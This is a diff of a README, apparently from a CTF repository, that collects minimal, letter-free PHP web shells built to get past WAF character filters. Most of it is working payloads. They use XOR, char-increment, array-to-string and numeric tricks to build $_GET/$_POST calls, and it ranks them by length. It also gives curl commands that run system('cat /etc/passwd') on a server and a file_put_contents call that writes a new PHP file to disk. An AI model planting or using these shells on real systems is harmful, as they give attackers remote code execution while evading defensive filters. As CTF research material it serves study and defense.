@@ -3,13 +3,17 @@
 The main goal of a php shell is that you can execute code on the server from the outside.
 
 ## Intro
+
 This can happen via a normal eval shell or with a tiny shell like this:
+
 ```php
 <?=`$_GET[1]`?>
 ```
+
 The downside is that the most WAFs at a CTF filter alot of available chars out to make the exploitation harder.
 
-Common chars to be blocked or filtered are 
+Common chars to be blocked or filtered are
+
 ```
 "'`a-zA-Z
 ```
@@ -44,7 +48,7 @@ string with the value "Array" which then can be crafted in \_POST by the xor ope
 | a      | 2      | S      |
 | a      | 5      | T      |
 
-Which resulted in \_POST and then can be used to run functions with arguments over code. 
+Which resulted in \_POST and then can be used to run functions with arguments over code.
 (This feature is present since php7)
 
 And can be used like this:
@@ -59,6 +63,7 @@ $_[0]($_[1]); // Equals to $_POST[0]($_POST[1]) => can be system('ls')
 That's quite cool but it was so big that it would hit different waf rules such as length restrictions.
 So I started to optimize the code, I did this by restructuring the code and remove parts which are not needed.
 The end result was:
+
 ```php
 <?=$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]);
 ```
@@ -79,62 +84,94 @@ So i started to investigate how this could be avoided, and found the following M
 4. Long numbers `9**99` => `2.9512665430653E+94`
 5. Char Increment `'A'++` => `B`
 
-The speciality of the `Underscore constant` is that this will only work on pre php8 
+The speciality of the `Underscore constant` is that this will only work on pre php8
 versions since the use of underscore as constant was then removed.
 
 Some version mix methods to be able to create working shells.
 
 ## Array into String (will throw warnings)
+
 **GET**
+
 ```php
 <?=$_=[]..1;$_=$_[1].$_[1].$_[1].$_[3]^-575..-1;$$_[0]($$_[1]);
 ```
+
 **POST**
+
 ```php
 <?=$_=[]..1;$_=$_[1].$_[3].$_[3].$_[3].$_[4]^-1.2.-1;$$_[0]($$_[1]);
 ```
+
 ## Infinite result into string
+
 **GET**
+
 ```php
 <?=$_=9**999...1;$_=801..-1^($_[4].+92..$_[0])^$_;$$_[0]($$_[1]);
 ```
+
 **POST**
+
 ```php
 <?=$_=-9**999...1;$_=4408..-1^$_^$_[3].$_[0].$_[6].$_[0].$_[1];$$_[0]($$_[1]);
 ```
+
 ---
+
 ## Underscore constant (deprecated in php8)
+
 **GET**
+
 ```php
 <?=$_=[]._;$_=_.($_[2].$_[2].$_[3]^575.._);$$_[0]($$_[1]);
 ```
+
 **POST**
+
 ```php
 <?=$_=[]._;$_=_.($_[3].$_[4].$_[3].$_[3]^1625.._);$$_[0]($$_[1]);
 ```
+
 ---
+
 ## Char Increment
+
 **GET**
+
 ```php
 <?=[$_=([]..1)[0],++$_,++$_,$__=$_++,++$_,++$_,++$_,$__.=++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,$_=$__.++$_,$__=$_(95).$_(71).$_(69).$_(84),$$__[0]($$__[1])];
 ```
+
 **POST**
+
 ```php
 <?=[$_=([]..1)[0],++$_,++$_,$__=$_++,++$_,++$_,++$_,$__.=++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,++$_,$_=$__.++$_,$__=$_(95).$_(80).$_(79).$_(83).$_(84),$$__[0]($$__[1])];
 ```
+
 ---
+
 ## Long numbers
+
 **GET**
+
 ```php
 <?=$_=(9**99...1)[15];$__=$_;$__++;$__++;$__++;$_=7002...1^-20.1..1^$_.$_.$_.$__;$$_[0]($$_[1]);
 ```
+
 **POST**
+
 ```php
 <?=$_=(9**99...1)[15];$_++;$_=4.08.$_^-89..-1^$_.$_.$_.$_;$__=$_[3];$_.=++$__;$$_[0]($$_[1]);
 ```
+
 ---
 
 ## Length Ranking
+
+Note the needed chars `<?=>` are only relevant when you are not in php context and need to declare it.
+If you are already in php you can ignore them and use teh shells without it but to be fair I included them in the
+payload length and at the needed chars.
 
 | Rank | Version                     | Method | Length | Needed Chars            |
 |------|-----------------------------|--------|--------|-------------------------|
@@ -149,7 +186,8 @@ Some version mix methods to be able to create working shells.
 | 9    | Char Increment              | GET    | 169    | <?=\[$_(].1)0,+957684;  |
 | 10   | Char Increment              | POST   | 176    | <?=\[$_(].1)0,+958734;  |
 
-
+I also created some special versions which can bypass some more checks but with length tradeoffs.
+You can check them out [here](specials/README.md)
 
 To query the shells you can use the browser or these snippets:
 
@@ -162,10 +200,11 @@ curl https://host.ctf.com/shell.php -X POST -F "0=system" -F "1=cat /etc/passwd"
 ```
 
 ## Extend the logic to allow enhanced function calling
+
 Since this is a really simple shell there are some boundaries to it, such as it only allows to call
 a function with one argument, and it will by default not print anything except teh function called does.
 
-So for example if the `system` and any other shell functions is unavailable the flag needs to be extracted over 
+So for example if the `system` and any other shell functions is unavailable the flag needs to be extracted over
 `file_get_contents` but since this function does not print we need to print the result.
 
 We can do this by extending the logic at the end of each shell presented above `$$_[0]($$_[1]);`.
@@ -176,10 +215,13 @@ If a other function with more parameters needs to be called the logic needs to b
 `$$_[0]($$_[1],$$_[2]);`.
 `0=file_put_contents&1=/var/www/html/info.php&2=<?php phpinfo();?>`
 
-You can cluster these together as you like, advice is that if you exceed more than 3 variable uses of `$$_` you should simplify
-the shell to set the `$_` variable to `$$_` so we have `_GET` or `_POST` directly in the variable and can use it like this:
+You can cluster these together as you like, advice is that if you exceed more than 3 variable uses of `$$_` you should
+simplify
+the shell to set the `$_` variable to `$$_` so we have `_GET` or `_POST` directly in the variable and can use it like
+this:
 `$_[0]($_[1]);` this reduces the size needed.
 Full example of this for the `Underscore constant` Method here:
+
 ```php
 <?=$_=[]._;$_=${_.($_[2].$_[2].$_[3]^575.._)};$_[0]($_[1]($_[2],$_[3]));
 ```
@@ -190,8 +232,9 @@ This will allow calling of a function with unlimited parameters and print the re
 ---
 
 ## Contribute
+
 If you find any other option to generate a string with chars in the range to generate `_GET` or `_POST`
-I would be happy to include them in the ranking and if possible to optimize them. 
+I would be happy to include them in the ranking and if possible to optimize them.
 The only restriction is that it needs to be less than `200 chars`
 
 Cli-Ish over and out.
